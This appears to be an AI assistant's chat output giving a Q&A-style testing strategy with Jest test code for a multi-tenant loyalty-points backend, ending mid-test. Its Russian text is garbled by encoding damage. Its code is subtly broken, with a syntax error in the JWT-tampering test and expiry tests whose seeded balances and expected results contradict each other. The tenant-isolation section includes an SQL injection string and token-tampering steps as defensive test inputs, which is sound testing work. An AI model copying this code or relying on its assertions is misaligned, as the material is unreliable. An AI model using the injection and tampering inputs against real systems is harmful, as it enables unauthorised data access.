        level: { earnPercentage: 10 },
        rules: [],
      })).toBe(2);

      // 3.5 โ 4 (round to even)
      expect(service.calculateEarnedBalls({
        checkAmount: 35,
        level: { earnPercentage: 10 },
        rules: [],
      })).toBe(4);
    });

    // 4. Property-Based Testing
    it('should never return negative balls', () => {
      fc.assert(
        fc.property(
          fc.integer({ min: 1, max: 999999 }), // Check amount
          fc.integer({ min: 0, max: 100 }),    // Earn percentage
          (amount, percentage) => {
            const result = service.calculateEarnedBalls({
              checkAmount: amount,
              level: { earnPercentage: percentage },
              rules: [],
            });
            return result >= 0;
          }
        ),
        { numRuns: 1000 } // Run 1000 random tests
      );
    });

    it('should always return <= checkAmount (max 100%)', () => {
      fc.assert(
        fc.property(
          fc.integer({ min: 1, max: 999999 }),
          fc.integer({ min: 0, max: 100 }),
          (amount, percentage) => {
            const result = service.calculateEarnedBalls({
              checkAmount: amount,
              level: { earnPercentage: percentage },
              rules: [],
            });
            return result <= amount; // Can't earn more than 100%
          }
        ),
        { numRuns: 1000 }
      );
    });

    it('should be idempotent (same input = same output)', () => {
      fc.assert(
        fc.property(
          fc.integer({ min: 1, max: 999999 }),
          fc.integer({ min: 0, max: 100 }),
          (amount, percentage) => {
            const result1 = service.calculateEarnedBalls({
              checkAmount: amount,
              level: { earnPercentage: percentage },
              rules: [],
            });
            
            const result2 = service.calculateEarnedBalls({
              checkAmount: amount,
              level: { earnPercentage: percentage },
              rules: [],
            });
            
            return result1 === result2;
          }
        ),
        { numRuns: 1000 }
      );
    });

    // 5. Decimal Precision
    it('should handle decimal amounts without precision loss', () => {
      const result = service.calculateEarnedBalls({
        checkAmount: 2850.50, // Decimal check amount
        level: { earnPercentage: 10 },
        rules: [],
      });
      
      expect(result).toBe(285); // Round: 285.05 โ 285
    });
  });
});
```

**package.json:**

```json
{
  "devDependencies": {
    "fast-check": "^3.15.0"
  }
}
```


***

### **2. Loyalty Rules Matching - ัะตััะธัะพะฒะฐะฝะธะต ะฟัะธะพัะธัะตัะพะฒ?**

**ะะพะฝัะตะบัั:** ะะพะถะตั ะฑััั 10+ rules ั ัะฐะทะฝัะผะธ conditions ะธ priorities.

```typescript
// Example rules:
// Rule 1 (priority 1): Weekends โ 15%
// Rule 2 (priority 2): Check > 5000โฝ โ 12%
// Rule 3 (priority 3): Default โ 10%
```

**ะะพะฟัะพั:** ะะฐะบ ัะตััะธัะพะฒะฐัั, ััะพ ะฟัะฐะฒะธะปัะฝัะน rule ะฟัะธะผะตะฝัะตััั?

- A) ะขะตััะธัะพะฒะฐัั ะบะฐะถะดัะน rule ะพัะดะตะปัะฝะพ
- B) ะขะตััะธัะพะฒะฐัั ะบะพะผะฑะธะฝะฐัะธะธ rules (2-3 rules)
- C) ะขะตััะธัะพะฒะฐัั ะฒัะต ะฒะพะทะผะพะถะฝัะต ะบะพะผะฑะธะฝะฐัะธะธ (exhaustive)
- D) B + ัะตััะธัะพะฒะฐัั edge cases (conflicting rules, same priority)

**ะะะ ะะซะะะ: D**

**ะะะะกะะะะะะะ:**

- Exhaustive testing (C) = combinatorial explosion (10 rules = 1024 ะบะพะผะฑะธะฝะฐัะธะน)
- B + D = ะพะฟัะธะผะฐะปัะฝัะน ะฑะฐะปะฐะฝั: ัะตััะธััะตะผ common cases + edge cases

**ะะะะะะะะฆะะฏ:**

```typescript
// loyalty-rules-matching.service.spec.ts
describe('LoyaltyRulesMatchingService', () => {
  let service: LoyaltyRulesMatchingService;

  beforeEach(async () => {
    const module = await Test.createTestingModule({
      providers: [LoyaltyRulesMatchingService],
    }).compile();

    service = module.get(LoyaltyRulesMatchingService);
  });

  describe('findMatchingRule', () => {
    // 1. Single Rule
    it('should match default rule', () => {
      const rules = [
        { id: '1', priority: 1, earnPercentage: 10, conditions: {} },
      ];

      const result = service.findMatchingRule({
        checkAmount: 1000,
        dayOfWeek: 'Monday',
        rules,
      });

      expect(result.id).toBe('1');
      expect(result.earnPercentage).toBe(10);
    });

    // 2. Multiple Rules - Priority Order
    it('should match highest priority rule first', () => {
      const rules = [
        { id: '1', priority: 3, earnPercentage: 10, conditions: {} }, // Default
        { id: '2', priority: 1, earnPercentage: 15, conditions: { dayOfWeek: 'Saturday' } }, // Highest
        { id: '3', priority: 2, earnPercentage: 12, conditions: { minCheckAmount: 5000 } },
      ];

      const result = service.findMatchingRule({
        checkAmount: 6000,
        dayOfWeek: 'Saturday',
        rules,
      });

      expect(result.id).toBe('2'); // Priority 1 wins
      expect(result.earnPercentage).toBe(15);
    });

    // 3. Conflicting Rules - Same Priority (Edge Case)
    it('should throw error on conflicting rules with same priority', () => {
      const rules = [
        { id: '1', priority: 1, earnPercentage: 10, conditions: { dayOfWeek: 'Saturday' } },
        { id: '2', priority: 1, earnPercentage: 15, conditions: { dayOfWeek: 'Saturday' } }, // Same priority!
      ];

      expect(() => service.findMatchingRule({
        checkAmount: 1000,
        dayOfWeek: 'Saturday',
        rules,
      })).toThrow('Multiple rules with same priority matched');
    });

    // 4. Complex Conditions
    it('should match rule with multiple conditions (AND logic)', () => {
      const rules = [
        {
          id: '1',
          priority: 1,
          earnPercentage: 20,
          conditions: {
            dayOfWeek: 'Friday',
            minCheckAmount: 5000,
            timeRange: { start: '18:00', end: '22:00' },
          },
        },
        { id: '2', priority: 2, earnPercentage: 10, conditions: {} },
      ];

      const result = service.findMatchingRule({
        checkAmount: 6000,
        dayOfWeek: 'Friday',
        time: '19:30',
        rules,
      });

      expect(result.id).toBe('1');
      expect(result.earnPercentage).toBe(20);
    });

    // 5. Partial Match - Fallback to Lower Priority
    it('should fallback to lower priority if higher priority not matched', () => {
      const rules = [
        { id: '1', priority: 1, earnPercentage: 15, conditions: { dayOfWeek: 'Saturday' } },
        { id: '2', priority: 2, earnPercentage: 10, conditions: {} }, // Default
      ];

      const result = service.findMatchingRule({
        checkAmount: 1000,
        dayOfWeek: 'Monday', // Not Saturday
        rules,
      });

      expect(result.id).toBe('2'); // Fallback to default
      expect(result.earnPercentage).toBe(10);
    });

    // 6. No Rules Matched
    it('should throw error if no rules matched', () => {
      const rules = [
        { id: '1', priority: 1, earnPercentage: 15, conditions: { minCheckAmount: 10000 } },
      ];

      expect(() => service.findMatchingRule({
        checkAmount: 1000, // Less than 10,000
        dayOfWeek: 'Monday',
        rules,
      })).toThrow('No matching loyalty rule found');
    });

    // 7. Rule Disabled
    it('should skip disabled rules', () => {
      const rules = [
        { id: '1', priority: 1, earnPercentage: 15, conditions: {}, isActive: false }, // Disabled
        { id: '2', priority: 2, earnPercentage: 10, conditions: {}, isActive: true },
      ];

      const result = service.findMatchingRule({
        checkAmount: 1000,
        dayOfWeek: 'Monday',
        rules,
      });

      expect(result.id).toBe('2');
    });
  });
});
```


***

### **3. Multi-tenancy Isolation - ะบะฐะบ ัะตััะธัะพะฒะฐัั?**

**ะะพะฝัะตะบัั:** **CRITICAL SECURITY**. Tenant A ะะ ะะะะะะ ะฒะธะดะตัั ะดะฐะฝะฝัะต Tenant B.

```typescript
// Service method:
async getGuestCards(tenantId: string, filters: Filters): Promise<GuestCard[]>
```

**ะะพะฟัะพั:** ะะพััะฐัะพัะฝะพ ะปะธ unit tests ะดะปั tenant isolation?

- A) ะะฐ, unit tests ะดะพััะฐัะพัะฝะพ (mock Prisma ั tenantId filter)
- B) ะะตั, ะฝัะถะฝั integration tests ั ัะตะฐะปัะฝะพะน ะะ
- C) ะะตั, ะฝัะถะฝั dedicated security tests (ะฟะพะฟััะบะฐ ะพะฑะพะนัะธ tenantId)
- D) B + C + automated penetration testing

**ะะะ ะะซะะะ: D**

**ะะะะกะะะะะะะ:**

- Unit tests ั mock ะะ ะะะกะขะะขะะงะะ (ะผะพะถะตะผ ะทะฐะฑััั ะดะพะฑะฐะฒะธัั tenantId filter ะฒ ัะตะฐะปัะฝะพะผ ะบะพะดะต)
- Integration tests + Security tests ะพะฑัะทะฐัะตะปัะฝั
- Automated penetration testing ะฝะฐัะพะดะธั ััะทะฒะธะผะพััะธ ะบะพัะพััะต ะผั ะฝะต ะฟัะตะดััะผะพััะตะปะธ

**ะะะะะะะะฆะะฏ:**

```typescript
// 1. UNIT TEST (ะฝะตะดะพััะฐัะพัะฝะพ, ะฝะพ ะฝัะถะตะฝ)
describe('GuestCardService - Unit', () => {
  it('should always include tenantId filter', () => {
    const prismaMock = {
      guestCard: {
        findMany: jest.fn(),
      },
    };

    service.getGuestCards('tenant-123', {});

    expect(prismaMock.guestCard.findMany).toHaveBeenCalledWith(
      expect.objectContaining({
        where: expect.objectContaining({
          tenantId: 'tenant-123',
        }),
      })
    );
  });
});

// 2. INTEGRATION TEST (ั ัะตะฐะปัะฝะพะน ะะ)
describe('GuestCardService - Integration', () => {
  let prisma: PrismaClient;

  beforeAll(async () => {
    prisma = new PrismaClient({
      datasources: { db: { url: process.env.TEST_DATABASE_URL } },
    });
  });

  beforeEach(async () => {
    // Seed test data
    await prisma.guestCard.createMany({
      data: [
        { id: '1', tenantId: 'tenant-A', userId: 'user-1', totalBalance: 1000 },
        { id: '2', tenantId: 'tenant-A', userId: 'user-2', totalBalance: 2000 },
        { id: '3', tenantId: 'tenant-B', userId: 'user-3', totalBalance: 3000 },
      ],
    });
  });

  afterEach(async () => {
    await prisma.guestCard.deleteMany();
  });

  it('should only return guests from tenant A', async () => {
    const result = await service.getGuestCards('tenant-A', {});

    expect(result).toHaveLength(2);
    expect(result.every(g => g.tenantId === 'tenant-A')).toBe(true);
  });

  it('should only return guests from tenant B', async () => {
    const result = await service.getGuestCards('tenant-B', {});

    expect(result).toHaveLength(1);
    expect(result[0].tenantId).toBe('tenant-B');
  });

  // 3. SECURITY TEST - ะะพะฟััะบะฐ ะพะฑะพะนัะธ tenantId
  it('should NOT allow accessing other tenant data via filters', async () => {
    const result = await service.getGuestCards('tenant-A', {
      // Malicious: try to override tenantId in filters
      tenantId: 'tenant-B',
    });

    // Should IGNORE malicious filter
    expect(result.every(g => g.tenantId === 'tenant-A')).toBe(true);
  });

  it('should NOT allow SQL injection via tenantId', async () => {
    const maliciousTenantId = "tenant-A' OR '1'='1"; // SQL injection attempt

    await expect(
      service.getGuestCards(maliciousTenantId, {})
    ).rejects.toThrow(); // Should throw validation error
  });

  // 4. PRISMA MIDDLEWARE TEST
  it('should automatically add tenantId via Prisma middleware', async () => {
    // Set tenant context
    tenantContext.run({ tenantId: 'tenant-A' }, async () => {
      const result = await prisma.guestCard.findMany();

      // Middleware ะดะพะปะถะตะฝ ะฐะฒัะพะผะฐัะธัะตัะบะธ ะดะพะฑะฐะฒะธัั tenantId filter
      expect(result.every(g => g.tenantId === 'tenant-A')).toBe(true);
    });
  });
});

// 3. AUTOMATED PENETRATION TEST
describe('Tenant Isolation - Penetration Testing', () => {
  it('should prevent tenant data leakage via API', async () => {
    // Create JWT token for Tenant A
    const tokenA = jwt.sign({ userId: 'user-1', tenantId: 'tenant-A' }, SECRET);

    // Try to access Tenant B's data
    const response = await request(app.getHttpServer())
      .get('/api/v1/guests')
      .set('Authorization', `Bearer ${tokenA}`)
      .query({ tenantId: 'tenant-B' }); // Malicious query param

    expect(response.status).toBe(200);
    
    // Should ONLY return Tenant A's data (ignore malicious param)
    const guests = response.body.data;
    expect(guests.every(g => g.tenantId === 'tenant-A')).toBe(true);
  });

  it('should prevent tenant isolation bypass via JWT tampering', async () => {
    // Create token for Tenant A
    const tokenA = jwt.sign({ userId: 'user-1', tenantId: 'tenant-A' }, SECRET);

    // Tamper token: change tenantId to tenant-B (without re-signing)
    const [header, payload, signature] = tokenA.split('.');
    const tampered Payload = Buffer.from(
      JSON.stringify({ userId: 'user-1', tenantId: 'tenant-B' })
    ).toString('base64');
    const tamperedToken = `${header}.${tamperedPayload}.${signature}`;

    const response = await request(app.getHttpServer())
      .get('/api/v1/guests')
      .set('Authorization', `Bearer ${tamperedToken}`);

    expect(response.status).toBe(401); // Signature invalid
  });
});
```


***

### **4. Ball Expiration Logic - ะณัะฐะฝะธัะฝัะต ััะปะพะฒะธั?**

**ะะพะฝัะตะบัั:** ะะฐะปะปั ัะณะพัะฐัั ัะตัะตะท 365 ะดะฝะตะน. Edge cases?

```typescript
// Expire balls older than 365 days
expireBalls(guestCardId: string, cutoffDate: Date): Promise<{ expired: number }>
```

**ะะพะฟัะพั:** ะงัะพ ัะตััะธััะตะผ?

- A) Happy path: ะฑะฐะปะปั ััะฐััะต 365 ะดะฝะตะน ัะณะพัะฐัั
- B) Edge case: ะฑะฐะปะปั ัะพะฒะฝะพ 365 ะดะฝะตะน (ะฒะบะปััะธัั ะธะปะธ ะฝะตั?)
- C) Edge case: timezone issues (UTC vs local time)
- D) ะัะต ะฒััะตะฟะตัะตัะธัะปะตะฝะฝะพะต + race conditions (concurrent expiration)

**ะะะ ะะซะะะ: D**

**ะะะะกะะะะะะะ:**

- Timezone issues = ัะฐััะฐั ะฟัะธัะธะฝะฐ bugs (UTC vs Europe/Moscow)
- Race conditions ะบัะธัะธัะฝั ะตัะปะธ 2 CRON job ะทะฐะฟัััะธะปะธัั ะพะดะฝะพะฒัะตะผะตะฝะฝะพ
- Boundary value (365 days exact) ะฝัะถะฝะพ ัะฒะฝะพ ะพะฟัะตะดะตะปะธัั

**ะะะะะะะะฆะะฏ:**

```typescript
describe('BallExpirationService', () => {
  let service: BallExpirationService;
  let prisma: PrismaClient;

  beforeAll(async () => {
    prisma = new PrismaClient({ datasources: { db: { url: process.env.TEST_DATABASE_URL } } });
  });

  beforeEach(async () => {
    // Seed test data
    const guestCard = await prisma.guestCard.create({
      data: { id: '1', tenantId: 'tenant-1', userId: 'user-1', totalBalance: 0 },
    });

    await prisma.ballTransaction.createMany({
      data: [
        // Expired (366 days ago)
        { id: '1', guestCardId: guestCard.id, amount: 100, earnedAt: subDays(new Date(), 366), status: 'ACTIVE' },
        
        // Exactly 365 days ago (BOUNDARY VALUE)
        { id: '2', guestCardId: guestCard.id, amount: 200, earnedAt: subDays(new Date(), 365), status: 'ACTIVE' },
        
        // Not expired (364 days ago)
        { id: '3', guestCardId: guestCard.id, amount: 300, earnedAt: subDays(new Date(), 364), status: 'ACTIVE' },
        
        // Recent (1 day ago)
        { id: '4', guestCardId: guestCard.id, amount: 400, earnedAt: subDays(new Date(), 1), status: 'ACTIVE' },
      ],
    });
  });

  afterEach(async () => {
    await prisma.ballTransaction.deleteMany();
    await prisma.guestCard.deleteMany();
  });

  // 1. Happy Path
  it('should expire balls older than 365 days', async () => {
    const result = await service.expireBalls('1');

    expect(result.expired).toBe(100); // Only transaction #1

    const expiredTx = await prisma.ballTransaction.findUnique({ where: { id: '1' } });
    expect(expiredTx.status).toBe('EXPIRED');
  });

  // 2. Boundary Value - Exactly 365 days
  it('should expire balls exactly 365 days old', async () => {
    const result = await service.expireBalls('1');

    expect(result.expired).toBe(300); // Transactions #1 + #2

    const boundaryTx = await prisma.ballTransaction.findUnique({ where: { id: '2' } });
    expect(boundaryTx.status).toBe('EXPIRED'); // INCLUDE 365 days
  });

  // 3. Should NOT expire recent balls
  it('should NOT expire balls less than 365 days old', async () => {
    const result = await service.expireBalls('1');

    const recentTx = await prisma.ballTransaction.findMany({
      where: { id: { in: ['3', '4'] } },
    });

    expect(recentTx.every(tx => tx.status === 'ACTIVE')).toBe(true);
  });

  // 4. Timezone Edge Case
  it('should handle timezone correctly (UTC vs local)', async () => {
    // Create transaction at 23:59 UTC (365 days ago)
    const utcMidnight = new Date('2025-02-12T23:59:00Z'); // 365 days ago
    const cutoffDate = subDays(utcMidnight, 365);

    await prisma.ballTransaction.create({
      data: {
        id: '5',
        guestCardId: '1',
        amount: 500,
        earnedAt: cutoffDate,
        status: 'ACTIVE',
      },
    });

    const result = await service.expireBalls('1');

    // Should expire based on UTC time (not local timezone)
    const tx5 = await prisma.ballTransaction.findUnique({ where: { id: '5' } });
    expect(tx5.status).toBe('EXPIRED');
  });

  // 5. Race Condition - Concurrent Expiration
  it('should handle concurrent expiration safely', async () => {
    // Run 2 expiration jobs simultaneously
    const [result1, result2] = await Promise.all([
      service.expireBalls('1'),
      service.expireBalls('1'),
    ]);

    // Both should succeed (idempotent)
    expect(result1.expired + result2.expired).toBeLessThanOrEqual(300); // Max 300 (not 600!)

    // Check final balance
    const guestCard = await prisma.guestCard.findUnique({ where: { id: '1' } });
    expect(guestCard.totalBalance).toBe(700); // 1000 - 300 expired = 700
  });

  // 6. Already Expired Balls
  it('should skip balls already expired', async () => {
    // Manually expire transaction #1
    await prisma.ballTransaction.update({
      where: { id: '1' },
      data: { status: 'EXPIRED' },
    });

    const result = await service.expireBalls('1');

    expect(result.expired).toBe(200); // Only transaction #2 (not #1 again)
  });

  // 7. Update Guest Card Balance
  it('should update guest card total balance', async () => {
    const before = await prisma.guestCard.findUnique({ where: { id: '1' } });
    expect(before.totalBalance).toBe(1000);

    await service.expireBalls('1');

    const after = await prisma.guestCard.findUnique({ where: { id: '1' } });
    expect(after.totalBalance).toBe(700); // 1000 - 300 expired = 700
  });

  // 8. Send Notification
  it('should send expiration notification to guest', async () => {
    const notificationSpy = jest.spyOn(notificationService, 'send');

    await service.expireBalls('1');

    expect(notificationSpy).toHaveBeenCalledWith({
      recipientId: 'user-1',
      type: 'BALLS_EXPIRED',
      channel: 'TELEGRAM',
      message: expect.stringContaining('300 ะฑะฐะปะปะพะฒ ัะณะพัะตะปะพ'),
    });
  });
});
```


***

### **5. Promo Campaign Validation - ะฑะธะทะฝะตั-ะฟัะฐะฒะธะปะฐ?**

**ะะพะฝัะตะบัั:** Admin ัะพะทะดะฐัั promo: "ะะฒะพะนะฝัะต ะฑะฐะปะปั ะฒ ะฟััะฝะธัั ั 18:00 ะดะพ 22:00".

```typescript
// Validate promo campaign
validatePromo(promo: PromoDto): ValidationResult
```

**ะะพะฟัะพั:** ะงัะพ ะฒะฐะปะธะดะธััะตะผ ะฒ unit tests?

- A) ะขะพะปัะบะพ required fields (name, start date, end date)
- B) Business rules: start < end, ะฝะต ะฟะตัะตัะตะบะฐะตััั ั ะดััะณะธะผะธ promo
- C) Complex conditions: ะดะตะฝั ะฝะตะดะตะปะธ, ะฒัะตะผั, ะผะธะฝะธะผะฐะปัะฝะฐั ััะผะผะฐ
- D) B + C + simulate promo application (dry-run)

**ะะะ ะะซะะะ: D**

**ะะะะกะะะะะะะ:**

- Required fields = ะฑะฐะทะพะฒะฐั ะฒะฐะปะธะดะฐัะธั (ะฝะตะดะพััะฐัะพัะฝะพ)
- Business rules ะบัะธัะธัะฝั (promo ะบะพะฝัะปะธะบั = ะฟะปะพัะพะน UX)
- Dry-run simulation ะฟัะตะดะพัะฒัะฐัะฐะตั production bugs

**ะะะะะะะะฆะะฏ:**

```typescript
describe('PromoValidationService', () => {
  let service: PromoValidationService;

  // 1. Required Fields
  describe('required fields', () => {
    it('should reject promo without name', async () => {
      const promo = {
        // name: missing
        startDate: new Date(),
        endDate: addDays(new Date(), 7),
      };

      const result = await service.validatePromo(promo);

      expect(result.valid).toBe(false);
      expect(result.errors).toContain('Name is required');
    });

    it('should reject promo without dates', async () => {
      const promo = {
        name: 'Black Friday',
        // startDate: missing
        // endDate: missing
      };

      const result = await service.validatePromo(promo);

      expect(result.valid).toBe(false);
      expect(result.errors).toContain('Start date is required');
      expect(result.errors).toContain('End date is required');
    });
  });

  // 2. Business Rules
  describe('business rules', () => {
    it('should reject if startDate >= endDate', async () => {
      const promo = {
        name: 'Invalid Promo',
        startDate: new Date('2026-02-20'),
        endDate: new Date('2026-02-10'), // Before start!
      };

      const result = await service.validatePromo(promo);

      expect(result.valid).toBe(false);
      expect(result.errors).toContain('End date must be after start date');
    });

    it('should reject if overlaps with existing promo', async () => {
      // Existing promo: 2026-02-10 to 2026-02-20
      await prisma.promo.create({
        data: {
          id: '1',
          name: 'Existing Promo',
          startDate: new Date('2026-02-10'),
          endDate: new Date('2026-02-20'),
          isActive: true,
        },
      });

      // New promo: 2026-02-15 to 2026-02-25 (overlaps!)
      const promo = {
        name: 'New Promo',
        startDate: new Date('2026-02-15'),
        endDate: new Date('2026-02-25'),
      };

      const result = await service.validatePromo(promo);

      expect(result.valid).toBe(false);
      expect(result.errors).toContain('Promo overlaps with "Existing Promo"');
    });

    it('should allow adjacent promos (no overlap)', async () => {
      // Existing promo ends on 2026-02-20
      await prisma.promo.create({
        data: {
          id: '1',
          name: 'Existing Promo',
          startDate: new Date('2026-02-10'),
          endDate: new Date('2026-02-20'),
          isActive: true,
        },
      });

      // New promo starts on 2026-02-21 (no overlap)
      const promo = {
        name: 'New Promo',
        startDate: new Date('2026-02-21'),
        endDate: new Date('2026-02-28'),
      };

      const result = await service.validatePromo(promo);

      expect(result.valid).toBe(true);
    });
  });

  // 3. Complex Conditions
  describe('complex conditions', () => {
    it('should validate day of week condition', async () => {
      const promo = {
        name: 'Friday Promo',
        startDate: new Date('2026-02-10'),
        endDate: new Date('2026-02-20'),
        conditions: {
          dayOfWeek: ['Friday', 'InvalidDay'], // Invalid!
        },
      };

      const result = await service.validatePromo(promo);

      expect(result.valid).toBe(false);
      expect(result.errors).toContain('Invalid day of week: InvalidDay');
    });

    it('should validate time range condition', async () => {
      const promo = {
        name: 'Evening Promo',
        startDate: new Date('2026-02-10'),
        endDate: new Date('2026-02-20'),
        conditions: {
          timeRange: {
            start: '22:00',
            end: '18:00', // End before start!
          },
        },
      };

      const result = await service.validatePromo(promo);

      expect(result.valid).toBe(false);
      expect(result.errors).toContain('Time range: end must be after start');
    });

    it('should validate minimum check amount', async () => {
      const promo = {
        name: 'Big Spender Promo',
        startDate: new Date('2026-02-10'),
        endDate: new Date('2026-02-20'),
        conditions: {
          minCheckAmount: -100, // Negative!
        },
      };

      const result = await service.validatePromo(promo);

      expect(result.valid).toBe(false);
      expect(result.errors).toContain('Minimum check amount must be positive');
    });
  });

  // 4. Dry-Run Simulation
  describe('dry-run simulation', () => {
    it('should simulate promo application', async () => {
      const promo = {
        name: 'Double Balls Friday',
        startDate: new Date('2026-02-10'),
        endDate: new Date('2026-02-20'),
        multiplier: 2,
        conditions: {
          dayOfWeek: ['Friday'],
          timeRange: { start: '18:00', end: '22:00' },
        },
      };

      // Dry-run: simulate transaction on Friday at 19:00
      const simulation = await service.simulatePromo(promo, {
        checkAmount: 2000,
        timestamp: new Date('2026-02-14T19:00:00'), // Friday 19:00
      });

      expect(simulation.matched).toBe(true);
      expect(simulation.ballsEarned).toBe(400); // 2000 * 10% * 2 = 400
    });

    it('should NOT match promo outside time range', async () => {
      const promo = {
        name: 'Evening Promo',
        startDate: new Date('2026-02-10'),
        endDate: new Date('2026-02-20'),
        multiplier: 2,
        conditions: {
          timeRange: { start: '18:00', end: '22:00' },
        },
      };

      // Simulate transaction at 12:00 (outside range)
      const simulation = await service.simulatePromo(promo, {
        checkAmount: 2000,
        timestamp: new Date('2026-02-14T12:00:00'),
      });

      expect(simulation.matched).toBe(false);
      expect(simulation.ballsEarned).toBe(200); // Normal: 2000 * 10% = 200
    });
  });
});
```


***

ะฅะพัะตัั ััะพะฑั ั ะฟัะพะดะพะปะถะธะป ั **ะพััะฐะปัะฝัะผะธ 40 ะฒะพะฟัะพัะฐะผะธ** (Integration Testing, E2E, Load Testing, Security, Chaos)? ๐

---

# ะัะพะดะพะปะถะฐะน

ะัะพะดะพะปะถะฐั! ๐

***

## **ะะะะ 2: INTEGRATION TESTING (10 ะฒะพะฟัะพัะพะฒ)**


***

### **6. POS Webhook Processing - idempotency?**

**ะะพะฝัะตะบัั:** POS ะผะพะถะตั ะพัะฟัะฐะฒะธัั ะพะดะธะฝ webhook **ะดะฒะฐะถะดั** ะธะท-ะทะฐ network timeout.

```typescript
POST /webhooks/transaction
{
  "posCheckId": "CHK-123456",
  "checkAmount": 2850,
  "guestPhone": "+79991234567"
}
```

**ะะพะฟัะพั:** ะะฐะบ ัะตััะธัะพะฒะฐัั idempotency?

- A) ะัะฟัะฐะฒะธัั ะพะดะธะฝ webhook โ ะฟัะพะฒะตัะธัั ัะตะทัะปััะฐั
- B) ะัะฟัะฐะฒะธัั ะพะดะธะฝ webhook **ะดะฒะฐะถะดั** โ ะฟัะพะฒะตัะธัั ััะพ ะฑะฐะปะปั ะฝะฐัะธัะปะธะปะธัั ัะพะปัะบะพ ัะฐะท
- C) B + ะพัะฟัะฐะฒะธัั ั ัะฐะทะฝะธัะตะน ะฒ 1 ัะตะบัะฝะดั (ะฟัะพะฒะตัะธัั Redis TTL)
- D) C + ะพัะฟัะฐะฒะธัั concurrent requests (10 ะพะดะฝะพะฒัะตะผะตะฝะฝะพ)

**ะะะ ะะซะะะ: D**

**ะะะะกะะะะะะะ:**

- Duplicate webhooks = REAL ะฟัะพะธะทะฒะพะดััะฒะตะฝะฝะฐั ะฟัะพะฑะปะตะผะฐ (ะฟัะพะธััะพะดะธั ัะตะณัะปััะฝะพ)
- Concurrent processing ะบัะธัะธัะตะฝ ะดะปั high-load scenarios
- Redis TTL ะดะพะปะถะตะฝ ัะฐะฑะพัะฐัั ะบะพััะตะบัะฝะพ

**ะะะะะะะะฆะะฏ:**

```typescript
// apps/backend/test/integration/pos-webhook-idempotency.spec.ts
describe('POS Webhook - Idempotency (Integration)', () => {
  let app: INestApplication;
  let prisma: PrismaClient;
  let redis: Redis;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    await app.init();

    prisma = app.get(PrismaClient);
    redis = app.get('REDIS');
  });

  beforeEach(async () => {
    // Clean database
    await prisma.ballTransaction.deleteMany();
    await prisma.posTransaction.deleteMany();
    await prisma.guestCard.deleteMany();
    await redis.flushall();

    // Seed test data
    await prisma.guestCard.create({
      data: {
        id: 'card-1',
        userId: 'user-1',
        tenantId: 'tenant-1',
        totalBalance: 1000,
        phone: '+79991234567',
      },
    });
  });

  afterAll(async () => {
    await app.close();
  });

  // 1. Happy Path - Single Webhook
  it('should process webhook once successfully', async () => {
    const webhook = {
      posSystem: 'IIKO_CLOUD',
      posCheckId: 'CHK-123456',
      tenantId: 'tenant-1',
      checkAmount: 2850,
      guestPhone: '+79991234567',
      timestamp: new Date().toISOString(),
    };

    const response = await request(app.getHttpServer())
      .post('/webhooks/transaction')
      .send(webhook)
      .expect(200);

    expect(response.body.success).toBe(true);

    // Check database
    const ballTx = await prisma.ballTransaction.findFirst({
      where: { sourceId: 'CHK-123456' },
    });
    expect(ballTx.amount).toBe(285); // 2850 * 10% = 285

    const guestCard = await prisma.guestCard.findUnique({ where: { id: 'card-1' } });
    expect(guestCard.totalBalance).toBe(1285); // 1000 + 285
  });

  // 2. Duplicate Webhook - Same Request Twice
  it('should handle duplicate webhook (idempotent)', async () => {
    const webhook = {
      posSystem: 'IIKO_CLOUD',
      posCheckId: 'CHK-123456',
      tenantId: 'tenant-1',
      checkAmount: 2850,
      guestPhone: '+79991234567',
      timestamp: new Date().toISOString(),
    };

    // Send first webhook
    await request(app.getHttpServer())
      .post('/webhooks/transaction')
      .send(webhook)
      .expect(200);

    // Send duplicate webhook
    const response2 = await request(app.getHttpServer())
      .post('/webhooks/transaction')
      .send(webhook)
      .expect(200);

    expect(response2.body.success).toBe(true);
    expect(response2.body.alreadyProcessed).toBe(true);

    // Check that balls credited ONLY ONCE
    const ballTransactions = await prisma.ballTransaction.findMany({
      where: { sourceId: 'CHK-123456' },
    });
    expect(ballTransactions).toHaveLength(1);

    const guestCard = await prisma.guestCard.findUnique({ where: { id: 'card-1' } });
    expect(guestCard.totalBalance).toBe(1285); // NOT 1570!
  });

  // 3. Duplicate with 1 Second Delay (Redis TTL Check)
  it('should handle duplicate webhook after 1 second', async () => {
    const webhook = {
      posSystem: 'IIKO_CLOUD',
      posCheckId: 'CHK-123456',
      tenantId: 'tenant-1',
      checkAmount: 2850,
      guestPhone: '+79991234567',
      timestamp: new Date().toISOString(),
    };

    // Send first webhook
    await request(app.getHttpServer())
      .post('/webhooks/transaction')
      .send(webhook);

    // Wait 1 second
    await new Promise(resolve => setTimeout(resolve, 1000));

    // Send duplicate webhook
    const response2 = await request(app.getHttpServer())
      .post('/webhooks/transaction')
      .send(webhook);

    expect(response2.body.alreadyProcessed).toBe(true);

    // Check Redis cache still active
    const cacheKey = `idempotency:tenant-1:IIKO_CLOUD:CHK-123456`;
    const cached = await redis.get(cacheKey);
    expect(cached).toBeTruthy();
  });

  // 4. Concurrent Webhooks (10 simultaneous)
  it('should handle 10 concurrent duplicate webhooks', async () => {
    const webhook = {
      posSystem: 'IIKO_CLOUD',
      posCheckId: 'CHK-CONCURRENT',
      tenantId: 'tenant-1',
      checkAmount: 5000,
      guestPhone: '+79991234567',
      timestamp: new Date().toISOString(),
    };

    // Send 10 webhooks simultaneously
    const promises = Array(10).fill(null).map(() =>
      request(app.getHttpServer())
        .post('/webhooks/transaction')
        .send(webhook)
    );

    const responses = await Promise.all(promises);

    // All should succeed (HTTP 200)
    expect(responses.every(r => r.status === 200)).toBe(true);

    // But balls credited ONLY ONCE
    const ballTransactions = await prisma.ballTransaction.findMany({
      where: { sourceId: 'CHK-CONCURRENT' },
    });
    expect(ballTransactions).toHaveLength(1);
    expect(ballTransactions[0].amount).toBe(500);

    const guestCard = await prisma.guestCard.findUnique({ where: { id: 'card-1' } });
    expect(guestCard.totalBalance).toBe(1500); // 1000 + 500 (NOT 6000!)
  });

  // 5. Different posCheckId - Should Process Both
  it('should process webhooks with different posCheckId separately', async () => {
    const webhook1 = {
      posSystem: 'IIKO_CLOUD',
      posCheckId: 'CHK-111',
      tenantId: 'tenant-1',
      checkAmount: 1000,
      guestPhone: '+79991234567',
      timestamp: new Date().toISOString(),
    };

    const webhook2 = {
      posSystem: 'IIKO_CLOUD',
      posCheckId: 'CHK-222', // Different!
      tenantId: 'tenant-1',
      checkAmount: 2000,
